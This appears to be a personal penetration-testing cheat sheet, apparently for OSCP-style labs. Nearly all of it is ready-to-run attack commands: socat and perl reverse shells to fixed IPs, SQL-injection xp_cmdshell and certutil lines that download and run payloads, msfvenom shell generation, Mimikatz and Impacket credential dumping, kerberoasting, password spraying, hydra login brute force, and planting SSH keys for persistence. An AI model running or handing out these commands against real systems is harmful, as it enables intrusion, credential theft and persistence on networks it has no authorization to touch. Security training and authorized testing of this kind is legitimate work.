(Knowing the mouse might one day hack the computerized safe and get the cheese...Fills you with determination.)

______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
cewl:
for custom wordlist from crawling webpages, use cewl! https://github.com/digininja/CeWL
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
curl:
○ curl -XPUT -d @shell.php http://website.site/webdav/shell.php -u 'admit:pass'
You can upload a file with credentials
nmap:
nmap $target -sV -sC -oN nmap_1
nmap — script smb-vuln* -p 139,445 -oN smb-vuln-scan $target

sudo rlwrap nc -lnvp 443
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
ldapsearch:
ldapsearch -v -x -b "DC=domainlol,DC=offsec" -H "ldap://192.168.195.122" "(objectclass=*)"
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________

socat:
on victim: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.45.191:4444
on client: socat file:`tty`,raw,echo=0 tcp-listen:4444
^V^v^v^v^v^v^v^v^v^v^v
socat TCP4-LISTEN:$port,fork STDOUT
socat.exe TCP4:$ip:$port EXEC:'cmd.exe',pipes
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
test ping:
sudo tcpdump -i tun0 icmp -v
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
autorecon
sudo env "PATH=$PATH" autorecon
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
gobuster dir -u https://example.com -w ~/wordlists/shortlist.txt
feroxbuster -u <url> -w <wordlist>
***remember to recurse into interesting directories. That's why ferox is useful.
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Downloading Files:
powershell iwr function, but it sometimes blocked by perms.
certutil.exe -urlcache -f http://10.0.0.5/bad.exe bad.exe
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
SQL:
check for perms:
Use master
EXEC sp_helprotect 'xp_cmdshell'
Upload:
test'; EXEC xp_cmdshell "powershell iwr -uri http://192.168.1.2/test.exe -outfile C:\\Users\Public\\payload.exe"-- 
Execute:
a' exec xp_cmdshell "powershell C:\\Users\\Public\\payload.exe"-- 
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Escelate Priv:
check gtfobins
https://github.com/BeichenDream/GodPotato/releases/tag/V1.20
https://github.com/itm4n/PrintSpoofer | PrintSpoofer.exe -i -c cmd
check running services with net start
check scheduled tasks with Get-ScheduledTask
Search Windows:
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\test\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path 'C:\YourStartingDirectory' -Directory -Recurse

net start
get-service
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Metasploit Handler:
https://www.offsec.com/metasploit-unleashed/binary-payloads/ | use exploit/multi/handler | set payload windows/x64/shell_reverse_tcp
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
MSFVenom:
https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Chisel:
https://blog.mkiesel.ch/posts/oscp_pivoting/
chisel server --port PORT --socks5 --reverse
.\chisel.exe client --max-retry-count 1 IP:PORT R:socks
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
ligolo-ng
sudo ip tuntap add user kali mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:443
.\agent.exe -connect 192.168.45.191:443 -ignore-cert
sudo ip route add 172.16.4.0/24 dev ligolo
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444
nmap 172.16.138.20 -Pn -PE
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Impacket (more like godpacket):
https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d
impacket-psexec domain/username:"pass"@IP
impacket-psexec -hashes 00000000000000000000000000000000:HASH administrator:@192.168.200.200
impacket-smbserver kali . -smb2support -user kali -password kali
net use P: \\192.168.45.191\kali /user:kali kali
copy filename.txt \\192.168.45.184\kali
impacket-mssqlclient user:'pass'@192.168.1.222 -port 494 -windows-auth
impacket-rdp_check
impacket-secretsdump -system SYSTEM -sam SAM LOCAL
for kerberoasting from linux: sudo impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/feefifo
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Pesky Service Perms?
try rebooting computer, or stopping then starting, or restarting, or sc.exe start [servicename]
remember, you can try doing a dll hijack, or you can try the easy way and just swap the exe.
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
crackmapexec:
crackmapexec smb/winrm/ldap/rdp/ftp/mssql/ssh 172.16.199.0/24 -u 'user' -p 'pass' -d domain (--shares)
Evil-winrm:
evil-winrm -u Administrator -p 'badpassword'  -i <IP>/<Domain> | can also use hash with -H
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Mimikatz:
sekurlsa::logonpasswords
lsadump::sam
lsadump::cache
lsadump::dcsync /user:domain\krbtgt /domain:lab.local
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
smbmap:
smbmap -H 192.168.197.248 -u phillipjfry -p Password2 -d website.com
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
smbclient:
smbclient //192.168.197.240/transfer -U tim --pw-nt-hash 54abzzzzzz -W example.com
proxychains -q smbclient //172.16.81.01/scripts -U example.com/tim --password 'passpass'
smbclient -N -L //192.168.5.5/

smbget
smbget -U anonymous -R 'smb://ip.address.here/sharetest testusername'
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
rdesktop:
proxychains -q rdesktop -u administrator -p 'va' 172.16.0.0
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
git:
git-dumper [http]
git show [hash id]
git log
git status
git reset --hard [git id hash]
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
john:
zip2john file.zip > crack.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
reg/putty:
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername"
reg query HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
crontab:
/etc/init.d
/etc/cron*
/etc/crontab
/etc/cron.allow
/etc/cron.d 
/etc/cron.deny
/etc/cron.daily
/etc/cron.hourly
/etc/cron.monthly
/etc/cron.weekly
/etc/sudoers
/etc/exports
/etc/anacrontab
/var/spool/cron
/var/spool/cron/crontabs/root
crontab -l
ls -alh /var/spool/cron;
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny*
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
hydra:
hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
responder:
sudo responder -I tun0 -d -w
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
Kerberoasting:
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
crack with 13100 hashcat
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
SMNP:
echo public > community
echo private >> community
echo manager >> community
sudo snmp-check 192.168.215.149
snmpwalk -c public -v1 -t 10 192.168.0.0
apt-get install snmp-mibs-downloader
snmpwalk -v <version123> -c public <IP> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
xenspawn:
git clone https://github.com/X0RW3LL/XenSpawn.git
sudo ./spawn.sh MACHINE_NAME
sudo systemd-nspawn -M MACHINE_NAME
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
kerbrute:
./kerbrute_linux_amd64 userenum --dc 192.168.1.19 -d ignite.local users.txt
./kerbrute_linux_amd64 passwordspray --dc 192.168.1.19 -d ignite.local users.txt Password@1
./kerbrute_linux_amd64 bruteuser --dc 192.168.1.19 -d ignite.local pass.txt aarti
cat userpass.txt | ./kerbrute_linux_amd64 --dc 192.168.1.19 -d ignite.local bruteforce -
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
linux:
ps -aux
netstat -lntu
sudo lsof -i -P -n | grep LISTEN
ss -lntu
nmap localhost -p 4000
sudo tcpdump -vvv -i ens192 udp port 514
find / -name *.cfg 2>/dev/null
watch -n 1 "ps -aux | grep pass"
sudo tcpdump -i lo -A | grep "pass"
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
MySQL:
mysql -u USERNAME -p 'DATABASENAME' -h 192.168.3.3

Postgres:
psql -h <REMOTE HOST> -p <REMOTE PORT> -U <DB_USER> <DB_NAME>

posgres command execute:
GRANT pg_read_server_files TO username;
GRANT pg_write_server_files TO username;
GRANT pg_execute_server_program TO username;
DROP TABLE IF EXISTS cmd_exec;
CREATE TABLE cmd_exec(cmd_output text);
COPY cmd_exec FROM PROGRAM 'perl -MIO -e ''$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"192.168.0.104:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;''';
SELECT * FROM cmd_exec;
DROP TABLE IF EXISTS cmd_exec;
______________________________________________________________________________________________________________________________________________________________________________________________________________________________________________________
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine

whoami /priv
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
python -c "import pty;pty.spawn('/bin/bash')"
ssh-agent sh -c 'ssh-add; ssh-add -L'
echo "sshkeyhere" > authorized_keys
ssh -i ~/.ssh/ed25519_gen tucker@10.10.11.136
export PATH=/dev/shm:$PATH

check open linux ports: netstat -tunlp
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
metaspoit:
sudo msfdb init
sudo systemctl enable postgresql
db_status
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
netcat file transfer:
nc -l -p 1234 > out.file
nc -w 3 [destination] 1234 < out.file
++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
powershell, check running services/ports:
Get-NetTcpConnection
find file:
Get-ChildItem -Path C:\ -Filter local.txt -Recurse -Name -Force
